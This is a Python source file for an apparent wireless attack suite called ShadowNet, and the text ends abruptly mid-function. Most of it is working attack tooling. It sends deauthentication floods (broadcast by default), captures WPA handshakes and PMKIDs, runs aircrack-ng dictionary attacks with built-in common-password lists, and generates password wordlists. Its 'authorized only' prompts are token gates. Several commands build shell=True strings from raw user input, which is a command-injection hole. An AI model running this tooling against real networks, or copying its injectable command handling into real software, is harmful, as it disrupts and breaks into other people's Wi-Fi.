#!/usr/bin/env python3
import subprocess
import sys
import time
import argparse
import json
import re
import threading
import random
import signal
from collections import defaultdict
from datetime import datetime
import os
from pathlib import Path
import platform
import ctypes

def detect_os():
    """Detect operating system and package manager.
    Returns dict with keys: system (Linux/Windows/Darwin), distro_id, pkg_manager.
    """
    system = platform.system()
    info = {"system": system, "distro_id": None, "pkg_manager": None}
    if system == "Linux":
        # Try /etc/os-release
        distro_id = None
        try:
            with open("/etc/os-release", "r") as f:
                data = f.read()
            for line in data.splitlines():
                if line.startswith("ID="):
                    distro_id = line.split("=", 1)[1].strip().strip('"').lower()
                    break
        except Exception:
            pass
        info["distro_id"] = distro_id

        # Determine package manager
        def _has(cmd):
            return subprocess.call(["which", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

        if _has("apt"): info["pkg_manager"] = "apt"
        elif _has("dnf"): info["pkg_manager"] = "dnf"
        elif _has("yum"): info["pkg_manager"] = "yum"
        elif _has("pacman"): info["pkg_manager"] = "pacman"
        else: info["pkg_manager"] = None
    elif system == "Windows":
        info["distro_id"] = "windows"
        info["pkg_manager"] = None
    elif system == "Darwin":
        info["distro_id"] = "macos"
        # Homebrew if present
        try:
            if subprocess.call(["which", "brew"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                info["pkg_manager"] = "brew"
        except Exception:
            pass
    return info

def is_root():
    """Return True if running with elevated privileges.
    Linux/macOS: euid == 0. Windows: IsUserAnAdmin().
    """
    try:
        return os.geteuid() == 0
    except AttributeError:
        # Windows
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

def enable_monitor_mode_linux(interface: str):
    """Enable monitor mode on Linux via airmon-ng if available, otherwise iw/ip.
    Returns True on success."""
    if not interface:
        print("[!] No interface specified")
        return False
    has_airmon = subprocess.call(["which", "airmon-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
    try:
        if has_airmon:
            print(f"[*] Enabling monitor mode using airmon-ng on {interface}...")
            res = subprocess.run(["sudo", "airmon-ng", "start", interface], check=False)
            return res.returncode == 0
        else:
            print(f"[*] Enabling monitor mode using iw/ip on {interface}...")
            subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
            subprocess.run(["sudo", "iw", interface, "set", "type", "monitor"], check=True)
            subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
            return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to enable monitor mode: {e}")
        return False

def disable_monitor_mode_linux(interface: str):
    """Disable monitor mode (restore managed) on Linux."""
    if not interface:
        print("[!] No interface specified")
        return False
    has_airmon = subprocess.call(["which", "airmon-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
    try:
        if has_airmon:
            print(f"[*] Disabling monitor mode using airmon-ng on {interface}...")
            res = subprocess.run(["sudo", "airmon-ng", "stop", interface], check=False)
            return res.returncode == 0
        else:
            print(f"[*] Restoring managed mode on {interface}...")
            subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
            subprocess.run(["sudo", "iw", interface, "set", "type", "managed"], check=True)
            subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
            return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to disable monitor mode: {e}")
        return False

def _find_wlanhelper_paths():
    """Return possible WlanHelper.exe paths on Windows."""
    return [
        r"C:\\Windows\\System32\\Npcap\\WlanHelper.exe",
        r"C:\\Program Files\\Npcap\\WlanHelper.exe",
        r"C:\\Program Files\\Npcap\\WlanHelper\\WlanHelper.exe",
        r"C:\\Program Files (x86)\\Npcap\\WlanHelper.exe",
        r"C:\\Program Files (x86)\\Npcap\\WlanHelper\\WlanHelper.exe",
    ]

def windows_wlanhelper_exists():
    if platform.system() != "Windows":
        return None
    for p in _find_wlanhelper_paths():
        if os.path.exists(p):
            return p
    return None

def enable_monitor_mode_windows(adapter_name_or_guid: str, channel: str = None):
    """Attempt to enable monitor mode on Windows using Npcap's WlanHelper.
    Returns True/False. Requires Npcap installed with raw 802.11 support.
    """
    exe = windows_wlanhelper_exists()
    if not exe:
        print("[!] Npcap WlanHelper.exe not found. Install Npcap with 'Support raw 802.11 traffic (and monitor mode)'.")
        print("    Download: https://npcap.com/#download")
        return False
    if not adapter_name_or_guid:
        print("[!] No adapter specified. Use 'List Windows adapters' to find the name or GUID.")
        return False
    try:
        print(f"[*] Enabling monitor mode on {adapter_name_or_guid} via WlanHelper...")
        res1 = subprocess.run([exe, adapter_name_or_guid, "mode", "monitor"], capture_output=True, text=True)
        if res1.returncode != 0:
            print(res1.stdout.strip())
            print(res1.stderr.strip())
            print("[!] WlanHelper failed to set monitor mode.")
            return False
        if channel:
            subprocess.run([exe, adapter_name_or_guid, "channel", str(channel)], check=False)
        print("[+] Monitor mode enabled (Windows)")
        print("    Note: Not all adapters/drivers support monitor mode on Windows.")
        return True
    except Exception as e:
        print(f"[!] Failed to enable monitor mode (Windows): {e}")
        return False

def list_windows_adapters():
    """List Windows network adapters via PowerShell. Returns list of dicts with Name, InterfaceDescription, ifIndex/Guid if available."""
    try:
        cmd = [
            "powershell",
            "-NoProfile",
            "-Command",
            "Get-NetAdapter | Select-Object -Property Name, InterfaceDescription, Status, MacAddress, ifIndex | Format-Table -HideTableHeaders"
        ]
        res = subprocess.run(cmd, capture_output=True, text=True)
        if res.returncode != 0:
            print("[!] Failed to list adapters via PowerShell")
            return []
        adapters = []
        for line in res.stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            # Rough parse: columns may be spaced; we capture name and description heuristically
            parts = re.split(r"\s{2,}", line)
            if len(parts) >= 2:
                adapters.append({"Name": parts[0], "InterfaceDescription": parts[1]})
        return adapters
    except Exception as e:
        print(f"[!] Error listing Windows adapters: {e}")
        return []

def install_dependencies(os_info):
    """Install required system packages based on OS. Returns True/False.
    Only performs automatic install on Linux/macOS when root and package manager is known.
    """
    system = os_info.get("system")
    if system == "Linux":
        pm = os_info.get("pkg_manager")
        if not pm:
            print("[!] Unknown Linux package manager. Please install dependencies manually: wireless-tools iw network-manager tcpdump aircrack-ng nmap")
            return False
        cmds = []
        if pm == "apt":
            cmds = [
                ["apt", "update", "-y"],
                ["apt", "install", "-y", "wireless-tools", "iw", "network-manager", "tcpdump", "aircrack-ng", "nmap", "net-tools"],
            ]
        elif pm == "dnf":
            cmds = [
                ["dnf", "install", "-y", "wireless-tools", "iw", "NetworkManager", "tcpdump", "aircrack-ng", "nmap", "net-tools"],
            ]
        elif pm == "yum":
            cmds = [
                ["yum", "install", "-y", "wireless-tools", "iw", "NetworkManager", "tcpdump", "aircrack-ng", "nmap", "net-tools"],
            ]
        elif pm == "pacman":
            cmds = [
                ["pacman", "-Sy", "--noconfirm"],
                ["pacman", "-S", "--noconfirm", "wireless_tools", "iw", "networkmanager", "tcpdump", "aircrack-ng", "nmap", "net-tools"],
            ]
        success = True
        for c in cmds:
            print("[*] Executing:", " ".join(c))
            rc = subprocess.call(["sudo"] + c)
            if rc != 0:
                success = False
                break
        if success:
            print("[+] System dependencies installed")
        return success
    elif system == "Darwin":
        if os_info.get("pkg_manager") != "brew":
            print("[!] Homebrew not found. Install Homebrew (https://brew.sh) or install deps manually.")
            return False
        cmds = [
            ["brew", "update"],
            ["brew", "install", "aircrack-ng", "nmap", "tcpdump"],
        ]
        success = True
        for c in cmds:
            print("[*] Executing:", " ".join(c))
            rc = subprocess.call(c)
            if rc != 0:
                success = False
                break
        return success
    elif system == "Windows":
        print("[i] On Windows, install the following manually:")
        print("    - Npcap (enable 'Support raw 802.11 traffic (and monitor mode)') https://npcap.com/")
        print("    - Wireshark (optional) https://www.wireshark.org/")
        print("    - aircrack-ng for Windows (optional) https://www.aircrack-ng.org/")
        return True
    else:
        print(f"[!] Unsupported OS: {system}")
        return False

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from scapy.all import *
    from scapy.layers.dot11 import *
    import netifaces
    SCAPY_AVAILABLE = True
except ImportError:
    print("Warning: Scapy not available. Some advanced features will be disabled.")
    SCAPY_AVAILABLE = False


ASCII_ART = [
    r" /$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$   /$$$$$$  /$$      /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$",
    r"/$$__  $$| $$  | $$ /$$__  $$| $$__  $$ /$$__  $$| $$  /$ | $$| $$$ | $$| $$_____/|__  $$__/",
    r"| $$  \__/| $$  | $$| $$  \ $$| $$  \ $$| $$  \ $$| $$ /$$$| $$| $$$$| $$| $$         | $$   ",
    r"|  $$$$$$ | $$$$$$$$| $$$$$$$$| $$  | $$| $$  | $$| $$/$$ $$ $$| $$ $$ $$| $$$$$      | $$   ",
    r" \____  $$| $$__  $$| $$__  $$| $$  | $$| $$  | $$| $$$$_  $$$$| $$  $$$$| $$__/      | $$   ",
    r" /$$  \ $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$$/ \  $$$| $$\  $$$| $$         | $$   ",
    r"|  $$$$$$/| $$  | $$| $$  | $$| $$$$$$$/|  $$$$$$/| $$/   \  $$| $$ \  $$| $$$$$$$$   | $$   ",
    r" \______/ |__/  |__/|__/  |__/|_______/  \______/ |__/     \__/|__/  \__/|________/   |__/   "
]


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def shadownet_intro():
    if not COLORAMA_AVAILABLE:
        print("SHADOWNET v2.0 - NETWORK INFILTRATION SUITE")
        time.sleep(2)
        return
    
    purple_colors = [Fore.MAGENTA, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.WHITE]
    
    for cycle in range(8):
        clear_screen()
        for line in ASCII_ART:
            glitched_line = ""
            for char in line:
                if random.random() < 0.08:
                    glitched_line += random.choice(purple_colors) + chr(random.randint(33, 126))
                else:
                    glitched_line += Fore.MAGENTA + Style.BRIGHT + char
            print(glitched_line)
        time.sleep(0.15)
    
    clear_screen()
    for line in ASCII_ART:
        print(Fore.MAGENTA + Style.BRIGHT + line)
    
    print(Fore.CYAN + Style.BRIGHT + "\n" + "="*78)
    print(Fore.WHITE + Style.BRIGHT + "             NETWORK INFILTRATION SUITE")
    print(Fore.WHITE + Style.BRIGHT + "             --------------------------")
    print(Fore.CYAN + Style.BRIGHT + "="*78)
    time.sleep(2)


class ShadowNet:
    def __init__(self):
        self.banner = """
╔══════════════════════════════════════════════════════════════════════════╗
║                             SHADOWNET v2.0                               ║
║  [00] SYSTEM SETUP & OS DETECTION                                        ║
║  [01] NETWORK RECONNAISSANCE      [05] WIRELESS BRUTEFORCE               ║
║  [02] HIDDEN SSID DISCOVERY       [06] HANDSHAKE CAPTURE                 ║
║  [03] ACCESS POINT ANALYSIS       [07] DICTIONARY ATTACK                 ║
║  [04] DEAUTH OPERATIONS           [08] SYSTEM INFILTRATION               ║
║  [09] WORDLIST MANAGEMENT         [10] FILE OPERATIONS                   ║
║  [11] WIRELESS AUTO-AUDIT                                                ║
║                                                                          ║
║  [99] EXIT SHADOWNET                                                     ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
        """
        self.wordlist_path = "/workspaces/ShadowNet/list.txt"
        self.scanner = None
        
    def display_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        if COLORAMA_AVAILABLE:
            print(Fore.CYAN + Style.BRIGHT + self.banner)
            print(Fore.YELLOW + f"CURRENT TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(Fore.GREEN + f"OPERATOR: 0NSEC_OPERATIVE")
            print(Fore.CYAN + Style.BRIGHT + "=" * 78)
        else:
            print(self.banner)
            print(f"CURRENT TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"OPERATOR: 0NSEC_OPERATIVE")
            print("=" * 78)
        
    def check_dependencies(self):
        os_info = detect_os()
        if os_info.get('system') == 'Windows':
            print("[i] Running on Windows: some modules require Linux tools (iwlist/airodump-ng).")
            print("[i] You can still use System Setup to enable monitor mode via Npcap and use limited features.")
            return True
        required_tools = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'nmap', 'iwlist']
        missing_tools = []
        for tool in required_tools:
            if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                missing_tools.append(tool)
        if missing_tools:
            print(f"[!] MISSING REQUIRED TOOLS: {', '.join(missing_tools)}")
            print("[!] INSTALL WITH: sudo apt-get install aircrack-ng nmap wireless-tools")
            return False
        return True

    def system_setup(self):
        print("\n[*] SYSTEM SETUP & OS DETECTION")
        print("=" * 50)
        os_info = detect_os()
        print(f"Detected OS: {os_info.get('system')} | Distro: {os_info.get('distro_id')} | Package Manager: {os_info.get('pkg_manager')}")
        print("\n[1] Install/Verify Dependencies")
        print("[2] List Wireless Interfaces")
        print("[3] Enable Monitor Mode (Linux)")
        print("[4] Disable Monitor Mode (Linux)")
        print("[5] List Windows Adapters (PowerShell)")
        print("[6] Enable Monitor Mode (Windows - Npcap)")
        print("[7] Show Npcap WlanHelper Path (Windows)")
        print("[0] Back")
        choice = input("[+] SELECT OPTION: ")

        if choice == "1":
            if os.geteuid() != 0 and os_info.get('system') != 'Windows':
                print("[!] Root privileges required to install dependencies.")
            else:
                install_dependencies(os_info)
        elif choice == "2":
            print("[*] Wireless interfaces (iw dev):")
            subprocess.run(["iw", "dev"]) if os_info.get('system') == 'Linux' else print("[i] Available on Linux only")
        elif choice == "3":
            if os_info.get('system') != 'Linux':
                print("[!] This option is for Linux only")
            else:
                iface = input("[+] Interface (e.g., wlan0): ")
                enable_monitor_mode_linux(iface)
        elif choice == "4":
            if os_info.get('system') != 'Linux':
                print("[!] This option is for Linux only")
            else:
                iface = input("[+] Interface (e.g., wlan0mon or wlan0): ")
                disable_monitor_mode_linux(iface)
        elif choice == "5":
            if os_info.get('system') != 'Windows':
                print("[i] This lists Windows adapters and requires PowerShell.")
            adapters = list_windows_adapters()
            if adapters:
                print("\nName | InterfaceDescription")
                for a in adapters:
                    print(f"- {a.get('Name')} | {a.get('InterfaceDescription')}")
            else:
                print("[i] No adapters found or not running on Windows.")
        elif choice == "6":
            if os_info.get('system') != 'Windows':
                print("[!] This option is for Windows only")
            else:
                adapter = input("[+] Adapter Name or GUID: ")
                ch = input("[+] Channel (optional): ") or None
                enable_monitor_mode_windows(adapter, ch)
        elif choice == "7":
            p = windows_wlanhelper_exists()
            print(p if p else "[i] WlanHelper.exe not found. Install Npcap.")
        else:
            return
    
    def create_wordlist(self):
        if not Path(self.wordlist_path).exists():
            default_passwords = [
                "password", "123456", "admin", "root", "toor", "pass",
                "12345678", "qwerty", "123456789", "letmein", "1234567890",
                "football", "iloveyou", "admin123", "welcome", "monkey",
                "login", "abc123", "starwars", "123123", "dragon",
                "passw0rd", "master", "hello", "freedom", "whatever",
                "qazwsx", "trustno1", "jordan23", "harley", "password123",
                "princess", "solo", "abc", "qwerty123", "password1",
                "welcome123", "admin1", "root123", "test", "guest",
                "user", "superman", "batman", "shadow", "hacker",
                "dedsec", "watchdogs", "network", "wireless", "internet"
            ]
            
            with open(self.wordlist_path, 'w') as f:
                for password in default_passwords:
                    f.write(password + '\n')
            print(f"[+] WORDLIST CREATED: {self.wordlist_path}")
    
    def network_recon(self):
        print("\n[*] NETWORK RECONNAISSANCE MODULE")
        print("=" * 50)
        target = input("[+] ENTER TARGET RANGE (192.168.1.0/24): ")
        
        if not target:
            print("[!] NO TARGET SPECIFIED")
            return
            
        print(f"[*] SCANNING {target}...")
        cmd = f"nmap -sn {target}"
        subprocess.run(cmd, shell=True)
        
        input("\n[PRESS ENTER TO CONTINUE]")

    def wireless_auto_audit(self):
        print("\n[*] WIRELESS AUTO-AUDIT (WIFITE-LIKE)")
        print("=" * 60)
        print("[!] AUTHORIZED PENTESTING ONLY")
        os_info = detect_os()
        if os_info.get('system') != 'Linux':
            print("[i] This module currently supports Linux.")
            input("\n[PRESS ENTER TO CONTINUE]")
            return

        tools_required = ['hcxdumptool', 'hcxpcapngtool', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
        missing = [t for t in tools_required if subprocess.call(['which', t], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0]
        if missing:
            print(f"[!] Missing tools: {', '.join(missing)}")
            print("[!] Install via setup or package manager (apt install hcxdumptool hcxpcapngtool aircrack-ng)")
            input("\n[PRESS ENTER TO CONTINUE]")
            return

        print("\nModes:")
        print("  [1] PMKID attack (hcxdumptool)")
        print("  [2] Handshake capture (airodump+deauth)")
        print("  [3] Both (PMKID then handshake)")
        mode = input("[+] Select mode: ")

        iface = input("[+] Interface (monitor-capable, e.g., wlan0 or wlan0mon): ")
        # Attempt to enable monitor mode if needed
        if not iface.endswith('mon'):
            _ = enable_monitor_mode_linux(iface)
            # airmon-ng typically renames to <iface>mon; give user a chance to override
            iface_mon = input("[?] Monitor interface name (ENTER to use original): ") or iface
        else:
            iface_mon = iface

        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        cap_dir = Path('captures')
        cap_dir.mkdir(parents=True, exist_ok=True)

        def run_pmkid(duration=60):
            print(f"[*] Starting PMKID capture for {duration}s on {iface_mon}...")
            pcap_path = cap_dir / f"pmkid_{ts}.pcapng"
            try:
                proc = subprocess.Popen(['sudo', 'hcxdumptool', '-i', iface_mon, '--enable_status=15', '-o', str(pcap_path)])
                time.sleep(int(duration))
                proc.terminate()
            except KeyboardInterrupt:
                proc.terminate()
            print("[*] Converting to hash format (22000)...")
            hash_path = cap_dir / f"pmkid_{ts}.22000"
            subprocess.run(['hcxpcapngtool', str(pcap_path), '-o', str(hash_path)], check=False)
            if hash_path.exists() and hash_path.stat().st_size > 0:
                print(f"[+] PMKID hashes saved: {hash_path}")
            else:
                print("[!] No PMKID hashes found.")
            return str(pcap_path), str(hash_path)

        def run_handshake(bssid=None, channel=None, deauth=True, duration=90):
            prefix = cap_dir / f"hs_{ts}"
            airodump_cmd = ['sudo', 'airodump-ng']
            if channel:
                airodump_cmd += ['-c', str(channel)]
            if bssid:
                airodump_cmd += ['--bssid', bssid]
            airodump_cmd += ['-w', str(prefix), iface_mon]
            print(f"[*] Starting airodump-ng, writing to {prefix}-01.cap ...")
            dump_proc = subprocess.Popen(airodump_cmd)
            deauth_proc = None
            try:
                if deauth and bssid:
                    print("[*] Sending periodic deauth to accelerate handshake capture...")
                    deauth_proc = subprocess.Popen(['sudo', 'aireplay-ng', '-0', '10', '-a', bssid, iface_mon])
                time.sleep(int(duration))
            except KeyboardInterrupt:
                pass
            finally:
                if deauth_proc and deauth_proc.poll() is None:
                    deauth_proc.terminate()
                if dump_proc and dump_proc.poll() is None:
                    dump_proc.terminate()
            cap_file = f"{prefix}-01.cap"
            if Path(cap_file).exists():
                print(f"[+] Capture saved: {cap_file}")
                wl = input("[?] Wordlist path to try with aircrack-ng (ENTER to skip): ")
                if wl:
                    print("[*] Attempting crack with aircrack-ng...")
                    subprocess.run(['aircrack-ng', '-w', wl, cap_file])
            else:
                print("[!] Handshake file not found. Try increasing duration or deauth.")
            return cap_file

        if mode == '1':
            dur = input("[+] Duration seconds (60): ") or '60'
            run_pmkid(dur)
        elif mode == '2':
            bssid = input("[+] Target BSSID (optional, ENTER to scan all): ") or None
            channel = input("[+] Channel (optional): ") or None
            deauth = input("[+] Send deauth? (Y/n): ").strip().lower() != 'n'
            dur = input("[+] Duration seconds (90): ") or '90'
            run_handshake(bssid=bssid, channel=channel, deauth=deauth, duration=dur)
        elif mode == '3':
            dur1 = input("[+] PMKID duration (60): ") or '60'
            run_pmkid(dur1)
            bssid = input("[+] Target BSSID for handshake (optional): ") or None
            channel = input("[+] Channel (optional): ") or None
            deauth = input("[+] Send deauth? (Y/n): ").strip().lower() != 'n'
            dur2 = input("[+] Handshake duration (90): ") or '90'
            run_handshake(bssid=bssid, channel=channel, deauth=deauth, duration=dur2)
        else:
            print("[!] Invalid selection")
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def hidden_ssid_discovery(self):
        print("\n[*] HIDDEN SSID DISCOVERY MODULE")
        print("=" * 50)
        
        if not hasattr(self, 'scanner') or self.scanner is None:
            self.scanner = HiddenNetworkScanner(timeout=60, passive_scan=True, use_scapy=True)
        
        try:
            networks = self.scanner.scan_networks()
            self.scanner.display_results(networks)
        except Exception as e:
            print(f"[!] SCAN ERROR: {e}")
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def access_point_analysis(self):
        print("\n[*] ACCESS POINT ANALYSIS MODULE")
        print("=" * 50)
        print("[1] LIST WIRELESS INTERFACES")
        print("[2] ENABLE MONITOR MODE")
        print("[3] SCAN ACCESS POINTS")
        print("[4] DETAILED NETWORK INFO")
        print("[5] DISABLE MONITOR MODE")
        
        choice = input("[+] SELECT OPTION: ")
        
        if choice == "1":
            subprocess.run("iwconfig", shell=True)
        elif choice == "2":
            interface = input("[+] INTERFACE (wlan0): ")
            os_info = detect_os()
            if os_info.get('system') == 'Linux':
                enable_monitor_mode_linux(interface)
            elif os_info.get('system') == 'Windows':
                print("[i] Use 'System Setup' menu for Windows monitor mode via Npcap.")
            else:
                print("[!] Monitor mode not supported on this OS from here.")
        elif choice == "3":
            interface = input("[+] MONITOR INTERFACE (wlan0mon): ")
            print(f"[*] SCANNING ACCESS POINTS ON {interface}...")
            subprocess.run(f"sudo airodump-ng {interface}", shell=True)
        elif choice == "4":
            interface = input("[+] INTERFACE: ")
            subprocess.run(f"sudo iwlist {interface} scan", shell=True)
        elif choice == "5":
            interface = input("[+] INTERFACE (wlan0mon/wlan0): ")
            os_info = detect_os()
            if os_info.get('system') == 'Linux':
                disable_monitor_mode_linux(interface)
            elif os_info.get('system') == 'Windows':
                print("[i] Use Npcap WlanHelper to restore mode: WlanHelper.exe <adapter> mode managed")
            else:
                print("[!] Not supported on this OS.")
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def deauth_operations(self):
        print("\n[*] DEAUTH OPERATIONS MODULE")
        print("=" * 50)
        print("[!] WARNING: FOR AUTHORIZED TESTING ONLY")
        
        confirm = input("[+] CONFIRM AUTHORIZATION (YES/NO): ")
        if confirm.upper() != "YES":
            print("[!] OPERATION CANCELLED")
            return
        
        interface = input("[+] MONITOR INTERFACE: ")
        target_bssid = input("[+] TARGET BSSID: ")
        client_mac = input("[+] CLIENT MAC (ENTER FOR BROADCAST): ")
        packets = input("[+] PACKET COUNT (10): ") or "10"
        
        if not client_mac:
            client_mac = "FF:FF:FF:FF:FF:FF"
        
        print(f"[*] LAUNCHING DEAUTH ATTACK...")
        cmd = f"sudo aireplay-ng -0 {packets} -a {target_bssid} -c {client_mac} {interface}"
        subprocess.run(cmd, shell=True)
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def wireless_bruteforce(self):
        print("\n[*] WIRELESS BRUTEFORCE MODULE")
        print("=" * 50)
        
        print("[1] USE DEFAULT WORDLIST")
        print("[2] SPECIFY CUSTOM WORDLIST")
        
        choice = input("[+] SELECT OPTION: ")
        
        if choice == "1":
            wordlist = self.wordlist_path
            if not Path(wordlist).exists():
                self.create_wordlist()
        elif choice == "2":
            wordlist = input("[+] WORDLIST FILE PATH: ")
            if not wordlist or not Path(wordlist).exists():
                print("[!] WORDLIST FILE NOT FOUND")
                return
        else:
            print("[!] INVALID SELECTION")
            return
        
        handshake_file = input("[+] HANDSHAKE FILE (.cap): ")
        if not handshake_file or not Path(handshake_file).exists():
            print("[!] HANDSHAKE FILE NOT FOUND")
            return
        
        print(f"[*] USING WORDLIST: {wordlist}")
        print(f"[*] STARTING BRUTEFORCE ATTACK...")
        
        cmd = f"aircrack-ng -w {wordlist} {handshake_file}"
        subprocess.run(cmd, shell=True)
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def handshake_capture(self):
        print("\n[*] HANDSHAKE CAPTURE MODULE")
        print("=" * 50)
        
        interface = input("[+] MONITOR INTERFACE: ")
        target_bssid = input("[+] TARGET BSSID: ")
        channel = input("[+] TARGET CHANNEL: ")
        output_file = input("[+] OUTPUT FILE NAME: ") or "handshake"
        
        print(f"[*] CAPTURING HANDSHAKE FROM {target_bssid}")
        print("[*] CTRL+C TO STOP CAPTURE")
        
        cmd = f"sudo airodump-ng -c {channel} --bssid {target_bssid} -w {output_file} {interface}"
        try:
            subprocess.run(cmd, shell=True)
        except KeyboardInterrupt:
            print("\n[*] CAPTURE STOPPED")
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def dictionary_attack(self):
        print("\n[*] DICTIONARY ATTACK MODULE")
        print("=" * 50)
        
        print("[1] USE DEFAULT WORDLIST")
        print("[2] SPECIFY CUSTOM WORDLIST")
        print("[3] GENERATE NEW WORDLIST")
        
        choice = input("[+] SELECT OPTION: ")
        
        if choice == "1":
            wordlist = self.wordlist_path
            if not Path(wordlist).exists():
                self.create_wordlist()
        elif choice == "2":
            wordlist = input("[+] WORDLIST FILE PATH: ")
            if not wordlist or not Path(wordlist).exists():
                print("[!] WORDLIST FILE NOT FOUND")
                return
        elif choice == "3":
            self.generate_custom_wordlist()
            wordlist = self.wordlist_path
        else:
            print("[!] INVALID SELECTION")
            return
        
        handshake_file = input("[+] HANDSHAKE FILE: ")
        if not Path(handshake_file).exists():
            print("[!] HANDSHAKE FILE NOT FOUND")
            return
        
        print(f"[*] USING WORDLIST: {wordlist}")
        print(f"[*] LAUNCHING DICTIONARY ATTACK...")
        cmd = f"aircrack-ng -w {wordlist} {handshake_file}"
        subprocess.run(cmd, shell=True)
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def generate_custom_wordlist(self):
        print("\n[*] WORDLIST GENERATOR")
        print("=" * 30)
        
        base_words = input("[+] BASE WORDS (comma separated): ").split(',')
        min_length = int(input("[+] MIN LENGTH (8): ") or "8")
        max_length = int(input("[+] MAX LENGTH (16): ") or "16")
        
        wordlist = []
        
        for word in base_words:
            word = word.strip()
            wordlist.append(word)
            wordlist.append(word.upper())
            wordlist.append(word.lower())
            wordlist.append(word.capitalize())
            
            for i in range(100):
                wordlist.append(f"{word}{i}")
                wordlist.append(f"{word}{i:02d}")
                wordlist.append(f"{word}{i:03d}")
            
            for year in range(2000, 2026):
                wordlist.append(f"{word}{year}")
        
        common_suffixes = ["123", "456", "789", "000", "111", "!", "@", "#", "$"]
        for word in base_words:
            for suffix in common_suffixes:
                wordlist.append(f"{word.strip()}{suffix}")
        
        filtered_wordlist = [w for w in wordlist if min_length <= len(w) <= max_length]
        
        with open(self.wordlist_path, 'w') as f:
            for password in set(filtered_wordlist):
                f.write(password + '\n')
        
        print(f"[+] GENERATED {len(set(filtered_wordlist))} PASSWORDS")
    
    def wordlist_management(self):
        print("\n[*] WORDLIST MANAGEMENT MODULE")
        print("=" * 50)
        print("[1] VIEW DEFAULT WORDLIST")
        print("[2] CREATE CUSTOM WORDLIST")
        print("[3] MERGE WORDLISTS")
        print("[4] WORDLIST STATISTICS")
        print("[5] DOWNLOAD WORDLISTS")
        
        choice = input("[+] SELECT OPTION: ")
        
        if choice == "1":
            self.view_wordlist()
        elif choice == "2":
            self.create_custom_wordlist()
        elif choice == "3":
            self.merge_wordlists()
        elif choice == "4":
            self.wordlist_stats()
        elif choice == "5":
            self.download_wordlists()
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def view_wordlist(self):
        wordlist_path = input("[+] WORDLIST PATH (ENTER FOR DEFAULT): ") or self.wordlist_path
        
        if not Path(wordlist_path).exists():
            print("[!] WORDLIST NOT FOUND")
            return
        
        try:
            with open(wordlist_path, 'r') as f:
                lines = f.readlines()
            
            print(f"\n[*] WORDLIST: {wordlist_path}")
            print(f"[*] TOTAL PASSWORDS: {len(lines)}")
            print("=" * 30)
            
            show_all = input("[+] SHOW ALL PASSWORDS? (y/N): ").lower() == 'y'
            
            if show_all:
                for i, line in enumerate(lines, 1):
                    print(f"{i:4d}: {line.strip()}")
            else:
                print("FIRST 20 PASSWORDS:")
                for i, line in enumerate(lines[:20], 1):
                    print(f"{i:4d}: {line.strip()}")
                if len(lines) > 20:
                    print(f"... AND {len(lines) - 20} MORE")
                    
        except Exception as e:
            print(f"[!] ERROR READING WORDLIST: {e}")
    
    def create_custom_wordlist(self):
        print("\n[*] CUSTOM WORDLIST CREATOR")
        print("=" * 30)
        
        output_file = input("[+] OUTPUT FILENAME: ") or "custom_wordlist.txt"
        
        print("\n[1] MANUAL ENTRY")
        print("[2] PATTERN GENERATION")
        print("[3] IMPORT FROM FILE")
        
        method = input("[+] SELECT METHOD: ")
        
        passwords = []
        
        if method == "1":
            print("[*] ENTER PASSWORDS (EMPTY LINE TO FINISH)")
            while True:
                password = input("PASSWORD: ")
                if not password:
                    break
                passwords.append(password)
        
        elif method == "2":
            base_word = input("[+] BASE WORD: ")
            include_numbers = input("[+] INCLUDE NUMBERS? (y/N): ").lower() == 'y'
            include_years = input("[+] INCLUDE YEARS? (y/N): ").lower() == 'y'
            include_symbols = input("[+] INCLUDE SYMBOLS? (y/N): ").lower() == 'y'
            
            passwords.append(base_word)
            passwords.append(base_word.upper())
            passwords.append(base_word.lower())
            passwords.append(base_word.capitalize())
            
            if include_numbers:
                for i in range(1000):
                    passwords.extend([
                        f"{base_word}{i}",
                        f"{i}{base_word}",
                        f"{base_word}{i:02d}",
                        f"{base_word}{i:03d}"
                    ])
            
            if include_years:
                for year in range(1990, 2030):
                    passwords.append(f"{base_word}{year}")
            
            if include_symbols:
                symbols = ["!", "@", "#", "$", "%", "123", "321"]
                for symbol in symbols:
                    passwords.append(f"{base_word}{symbol}")
        
        elif method == "3":
            source_file = input("[+] SOURCE FILE PATH: ")
            if Path(source_file).exists():
                with open(source_file, 'r') as f:
                    passwords = [line.strip() for line in f.readlines()]
            else:
